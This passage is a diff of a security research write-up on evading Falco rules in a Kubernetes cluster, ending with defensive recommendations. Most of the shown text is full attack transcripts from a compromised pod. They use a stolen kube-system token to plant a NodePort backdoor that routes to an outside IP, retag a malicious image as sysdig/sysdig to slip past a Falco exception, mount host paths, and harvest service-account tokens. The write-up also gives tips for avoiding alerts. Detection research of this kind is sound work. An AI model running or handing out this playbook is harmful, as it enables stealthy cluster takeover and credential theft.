+selfsubjectrulesreviews.authorization.k8s.io    []                  []     [create]
+                                                [/api/*]            []     [get]
+                                                [/api]              []     [get]
+                                                [/apis/*]           []     [get]
+                                                [/apis]             []     [get]
+                                                [/healthz]          []     [get]
+                                                [/healthz]          []     [get]
+                                                [/livez]            []     [get]
+                                                [/livez]            []     [get]
+                                                [/openapi/*]        []     [get]
+                                                [/openapi]          []     [get]
+                                                [/readyz]           []     [get]
+                                                [/readyz]           []     [get]
+                                                [/version/]         []     [get]
+                                                [/version/]         []     [get]
+                                                [/version]          []     [get]
+                                                [/version]          []     [get]
+```
+
+As expected, with kube-system token we can create K8s objects. Final step in the compromise according to Scenario 2:
+
+```
+[Compromised Pod]
+dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ cat <<EOF | ./kctl --token "eyJhbGciOi...MP08h9jzg" --insecure-skip-tls-verify --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT apply -f -
+> apiVersion: v1
+> kind: Service
+> metadata:
+>   name: istio-mgmt
+>   namespace: kube-system
+> spec:
+>   type: NodePort
+>   ports:
+>     - protocol: TCP
+>       nodePort: 31313
+>       port: 31313
+>       targetPort: $KUBERNETES_SERVICE_PORT
+> ---
+> apiVersion: v1
+> kind: Endpoints
+> metadata:
+>   name: istio-mgmt
+>   namespace: kube-system
+> subsets:
+>   - addresses:
+>       - ip: 35.247.21.15
+>     ports:
+>       - port: $KUBERNETES_SERVICE_PORT
+> EOF
+service/istio-mgmt unchanged
+endpoints/istio-mgmt configured
+-----
+[Node]
+sshayb@cloudshell:~$ kubectl get services --all-namespaces
+NAMESPACE     NAME                   TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)           AGE
+default       kubernetes             ClusterIP   10.52.0.1      <none>        443/TCP           3h37m
+...
+kube-system   istio-mgmt             NodePort    10.52.3.176    <none>        31313:31313/TCP   146m
+```
+
+All in all, we are successful in deploying the hidden workload on the compromised cluster and in addition deploying a NodePort as a future backdoor access. At the same time, we are careful enough not to trigger any rules except **Contact K8S API Server From Container**, which would result in multiple NOTICEs that might or might not fly under the radar of a vigilant SOC.
+
+Can we do better than that? Careful inspection of rule **Contact K8S API Server From Container** provides hints on the potential way - what if we use one of the container images excepted in macro k8s_containers?
+
+```
+- macro: k8s_containers
+  condition: >
+    (container.image.repository in (gcr.io/google_containers/hyperkube-amd64,
+     gcr.io/google_containers/kube2sky,
+     docker.io/sysdig/sysdig, docker.io/falcosecurity/falco,
+     sysdig/sysdig, falcosecurity/falco,
+     fluent/fluentd-kubernetes-daemonset, prom/prometheus,
+     ibm_cloud_containers)
+     or (k8s.ns.name = "kube-system"))
+```
+
+Of course, we cannot modify the image name in the original repo, but we can "tag" our malicious image within the context of the local daemon. And the full attack chain looks as follows:
+
+```
+[Compromised Pod]
+dashboard@dashboard-56755cd6c9-gg9w8:/tmp$ ./kctl run r00t3 --restart=Never -ti--rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"sshayb/fuber:latest","command":["/tmp/gbash"],"stdin": true,"tty":true,"volumeMounts": [{"mountPath": "/var/run","name": "test1"},{"mountPath": "/var/lib","name": "test2"}],"imagePullPolicy":"IfNotPresent"}],"volumes": [{"name":"test1","hostPath":{"path": "/var/run"}},{"name":"test2","hostPath":{"path": "/var/lib"}}]}}'
+If you don't see a command prompt, try pressing enter.
+root@r00t3:/tmp# ./gdocker pull sshayb/fuber:latest
+latest: Pulling from sshayb/fuber
+Digest: sha256:7dc92083c2b5524103988234902ac20ccbebc326d4c04cd5ab9163b9ef69d725
+Status: Image is up to date for sshayb/fuber:latest
+docker.io/sshayb/fuber:latest
+root@r00t3:/tmp# ./gdocker tag sshayb/fuber:latest sysdig/sysdig
+root@r00t3:/tmp# env | grep KUBE
+...
+KUBERNETES_SERVICE_PORT=443
+KUBERNETES_SERVICE_HOST=10.84.0.1
+root@r00t3:/tmp# ./gdocker run --rm -it -v /var/lib:/var/lib sysdig/sysdig
+root@8e5d231f002d:/tmp# ls
+docker  fubers  gbash  gdocker  gkubectl  runc-nsenter
+root@8e5d231f002d:/tmp# grep -iIrn kube-system /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/namespace
+...
+var/lib/kubelet/pods/dc186c2c-4990-4415-91d7-e04c1da8b091/volumes/kubernetes.io~secret/metrics-server-token-ckwnp/namespace:1:kube-system
+/var/lib/kubelet/pods/e9349520-b007-4d33-9924-2fb25efdd891/volumes/kubernetes.io~secret/default-token-lg5nm/namespace:1:kube-system
+...
+root@8e5d231f002d:/tmp# cat /var/lib/kubelet/pods/e9349520-b007-4d33-9924-2fb25efdd891/volumes/kubernetes.io~secret/default-token-lg5nm/token
+eyJh......0rxgzaSQ
+root@8e5d231f002d:/tmp# TOKEN=eyJhbG...gzaSQ
+root@8e5d231f002d:/tmp# KUBERNETES_SERVICE_PORT=443
+root@8e5d231f002d:/tmp# KUBERNETES_SERVICE_HOST=10.84.0.1
+root@8e5d231f002d:/tmp# ./gkubectl --token "$TOKEN" --insecure-skip-tls-verify --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT --cache-dir=/tmp auth can-i --list
+warning: the list may be incomplete: webhook authorizer does not support user rule resolution
+Resources                                       Non-Resource URLs   Resource Names   Verbs
+*.*                                             []                  []     [*]
+                                                [*]                 []     [*]
+selfsubjectaccessreviews.authorization.k8s.io   []                  []     [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                  []
+...
+-----
+[Falco]
+10:46:24.847425566: Notice Unexpected connection to K8s API Server from container (command=kctl run r00t3 --restart=Never -ti --rm --image lol --overrides {"spec":{"hostPID": true, "containers":[{"name":"1","image":"sshayb/fuber:latest","command":["/tmp/gbash"],"stdin": true,"tty":true,"volumeMounts": [{"mountPath": "/var/run","name": "test1"},{"mountPath": "/var/lib","name": "test2"}],"imagePullPolicy":"IfNotPresent"}],"volumes": [{"name":"test1","hostPath":{"path": "/var/run"}},{"name":"test2","hostPath":{"path": "/var/lib"}}]}} k8s.ns=prd k8s.pod=dashboard-56755cd6c9-gg9w8 container=8f5761fed4da image=securekubernetes/example-dashboard:latest connection=10.80.0.7:51452->10.84.0.1:443) k8s.ns=prd k8s.pod=dashboard-56755cd6c9-gg9w8 container=8f5761fed4da
+10:46:43.757631494: Notice Unexpected connection to K8s API Server from container (command=kctl run r00t3 --restart=Never -ti --rm --image lol --overrides {"spec":{"hostPID": true, "containers":[{"name":"1","image":"sshayb/fuber:latest","command":["/tmp/gbash"],"stdin": true,"tty":true,"volumeMounts": [{"mountPath": "/var/run","name": "test1"},{"mountPath": "/var/lib","name": "test2"}],"imagePullPolicy":"IfNotPresent"}],"volumes": [{"name":"test1","hostPath":{"path": "/var/run"}},{"name":"test2","hostPath":{"path": "/var/lib"}}]}} k8s.ns=prd k8s.pod=dashboard-56755cd6c9-gg9w8 container=8f5761fed4da image=securekubernetes/example-dashboard:latest connection=10.80.0.7:51564->10.84.0.1:443) k8s.ns=prd k8s.pod=dashboard-56755cd6c9-gg9w8 container=8f5761fed4da
+```
+
+As can be seen, the final result is absolute and stealthy control of the cluster. This is the most silent attack so far with only 2 NOTICEs from the initial invocation of kctl. Several things worth noticing:
+
+* The first spawned container is non-privileged to avoid **Launch Privileged Container**
+* When spawning the first container _/var/lib_ mapping is necessary to pass the access to the kubelet folders
+* The second spawned container is nested within the first container
+* The final command must specify the non-monitored cache directory, in this case _/tmp_. Otherwise **Write below root** rule is triggered multiple times (by default kubectl stores the cache in the _/root/.kube_ directory)
 
 ## Discussion and Recommendations
 
-The power of Falco is not in individual rules, but in groups of rules triggering together and overlapping when malicious action is performed. As we saw from the previous section, bypassing ALL the rules required to accomplish an attack phase is possible, but challenging. This task will be further complicated by the existance of custom rulesets in a customer environment, because those are invisible to the attacker as opposite to the default ruleset.
+The power of Falco is not in individual rules, but in groups of rules triggering together and overlapping when malicious action is performed. As we saw from the previous section, bypassing ALL the rules required to accomplish an attack phase is possible, but challenging. This task will be further complicated by the existence of custom rulesets in a customer environment because those are invisible to the attacker as opposed to the default ruleset.
 
 As in a case with all security products, good product security posture is about security layers and combination of security controls while not over-relying on one of the controls. Falco continues to be a great solution for detection phase of malicious activity within the cluster.  
 
 Some general recommendations and suggestions:
-- It seems that there is no easy way to prevent attacker from bypassing the rules relying on _proc.name_ and _file.name_. I suggest rethinking the reliance on _proc.name_ and _file.name_ fields for the existing and future rules. 
-- Too many rules include construct `and not` with every such constract being a potential for exception bypass.
-- Review rule priorities in the bypass context - easiness of evading WARNINGs and ERRORs through symlinks and executable namings often goes opposite to a difficulty in evading DEBUGs, INFOs and NOTICEs.
+- It seems that there is no easy way to prevent an attacker from bypassing the rules relying on _proc.name_ and _file.name_. I suggest rethinking the reliance on _proc.name_ and _file.name_ fields for the existing and future rules. 
+- Too many rules include construct `and not` with every such construct being a potential for exception bypass.
+- Review rule priorities in the bypass context - ease of evading WARNINGs and ERRORs through symlinks and executable naming often goes opposite to the difficulty in evading DEBUGs, INFOs and NOTICEs.
 - For the CVE-specific rules periodic check of public exploits is needed.
 - Encourage clients to develop their own private rulesets.
 ---
@@ -662,4 +933,5 @@ Some general recommendations and suggestions:
 [^5]: https://falco.org/docs/rules/supported-fields/
 [^6]: https://braiins.com/stratum-v2
 [^7]: https://github.com/draios/sysdig/pull/655/commits/209888d7f37c4357b164ca12248a38bac9de2e4b
-
+[^8]: https://www.youtube.com/watch?v=rBqBrYESryY
+[^9]: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
